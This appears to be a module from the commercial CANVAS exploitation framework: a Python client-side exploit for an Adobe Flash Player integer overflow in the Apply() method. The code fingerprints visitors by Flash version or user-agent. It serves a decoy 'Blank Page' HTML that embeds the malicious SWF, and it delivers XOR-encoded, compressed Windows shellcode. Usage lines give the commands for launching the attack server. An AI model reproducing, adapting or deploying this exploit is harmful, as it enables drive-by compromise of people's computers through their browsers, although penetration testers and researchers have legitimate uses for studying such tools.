#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import zlib
import re

from shellcode import shellcodeGenerator

from Crypto.Cipher import XOR
from httpclientside import httpclientside
from libs.spkproxy import header, body
from libs.ua_parser import user_agent_parser
from shellcode.standalone.windows import payloads64

from exploitutils import *
from tcpexploit import *
import canvasengine


NAME                              = 'adobe_flash_intoverflow_apply'
DESCRIPTION                       = 'Adobe Flash Player Integer Overflow in the Apply() method'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = 'Adobe'
DOCUMENTATION['Date public']      = 'Silent Patch'
DOCUMENTATION['References']       = ['']

DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION['VersionsAffected'] = 'Adobe Flash Player 9.0 - 17.0.0.169'
DOCUMENTATION['CVE Name']         = 'N/A'
DOCUMENTATION['CVE Url']          = 'N/A'
DOCUMENTATION['Notes']            = """

Works on all versions of Flash 17 except for the last (<= 17.0.0.169)

Tested on:

- Windows 7 x32 SP1 with IE 8 32 bits (Flash 16.0.0.235)
- Windows 7 x64 SP1 with IE 8 32 bits (Flash 16.0.0.305)
- Windows 7 x64 SP1 with IE 11 (Flash 17.0.0.169)


Usage:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:adobe_flash_intoverflow_apply -O auto_detect_exploits:0
python commandlineInterface.py -v 17 -p5555
"""

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['DELIVERY']              = 'HTTP'

CHANGELOG                         = """
"""


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version         = 0
        self.name            = NAME
        self.filename        = "%s.html" % randomstring(8)
        self.swffilename     = 'exp1'
        self.plugin_info     = None # we want clientd to give us a plugin dict
        self.refresh_rate    = 30
        self.xorer           = XOR.new("\x5a")
        self.badstring       = '\x00'

    def createShellcode(self):
        self.shellcode = self.createWin32ClientSideShellcode()

    def is_vulnerable(self, info_dict):
        if not self.is_windows(info_dict):
            self.log_error("This exploit only works on Windows targets (for now)!")
            return 0

        major, minor, build, patch = self.getFlashVersion(info_dict)

        if major > 9 and major <= 17:
            # all versions of 17.x are vulnerable except for the last
            if major == 17 and patch > 169:
                return 0

            return 1

        return 0

    def makefile(self):
        """
        Makes the exploit HTML
        """
        self.getArgs()

        filedata="""
        <html lang="en">
            <head>
                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
                <title>Blank Page</title>
            </head>
            <body>
            <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="100%" height="100%" id="apply">
                            <param name="movie" value="SWFFILENAME.swf" />
                            <param name="quality" value="high" />
                            <param name="bgcolor" value="#ffffff" />
                            <param name="allowScriptAccess" value="sameDomain" />
                            <param name="allowFullScreen" value="true" />
                            <!--[if !IE]>-->
                            <object type="application/x-shockwave-flash" data="SWFFILENAME.swf" width="100%" height="100%">
                                <param name="quality" value="high" />
                                <param name="bgcolor" value="#ffffff" />
                                <param name="allowScriptAccess" value="sameDomain" />
                                <param name="allowFullScreen" value="true" />
                            </object>
                            <!--<![endif]-->
                        </object>
            </body>
        </html>"""

        filedata = filedata.replace('SWFFILENAME', self.swffilename)
        filedata = filedata.replace('        ','')
        return filedata

    def makeSWF(self):
        with open(os.path.join(os.path.dirname(__file__), 'Resources', self.swffilename + '.swf'), 'rb') as f:
            return f.read()

    def makesploit(self, clientheader, clientbody):
        self.nlog("\n---------------\nmakesploit - URL = %s\n---------------\n" % clientheader.URL)

        h = header('SERVER')
        b = body()

        if self.plugin_info:
            info_dict = self.plugin_info
            self.log_info("We got a plugin info for this target - thanks clientd!")

            if self.is_vulnerable(info_dict):
                self.log_info("This client is most likely vulnerable")
                self.createShellcode()
            else:
                self.log_error("Bailing on this client as it is not likely to be vulnerable")
                return None, None
        else:
            # if there is no info about plugins, at least we can filter using
            # the user-agent making sure target is Windows
            useragent = clientheader.getStrValue(['User-Agent'])
            self.log("User-Agent = %s" % useragent)
            if "windows" in useragent.lower():
                self.log_info("This client is likely to be vulnerable")
                self.createShellcode()
            else:
                self.log_error("Bailing on this client as it is not likely to be vulnerable")
                return None, None

        self.nlog(clientheader.URL)
        if clientheader.URL.count(self.filename):
            self.nlog('Serving HTML file')
            sploitstring = self.makefile()
            b.setBody(sploitstring)
            h.addHeader('Content-Type', 'text/html')

        elif clientheader.URL.count(self.swffilename):
            self.nlog('Serving SWF file')
            b.setBody(self.makeSWF())
            h.addHeader('Content-Type', 'application/x-shockwave-flash')
            self.nlog('Served SWF file')

        elif clientheader.URL.count("code"):
            self.nlog("serving shellcode")
            h.addHeader('Content-Type', 'application/octet-stream')
            b.setBody(self.xorer.encrypt(zlib.compress(self.shellcode)))

        else:
            self.nlog('Redirecting to self')
            h.status = '302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type', 'text/html')

        return h, b

    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")

    def run(self):
        self.getArgs()

        # Build the html that triggers the vulnerability
        filedata = self.makefile()
        self.nlog('Opening %s for output' % self.filename)
        fd=file(self.filename, 'wb+')
        fd.write(filedata)
        fd.close()
        self.nlog('Wrote exploit HTML to %s' % self.filename)

        return 1


if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)

    if ret not in [0, 1, None]:
        ret.interact()
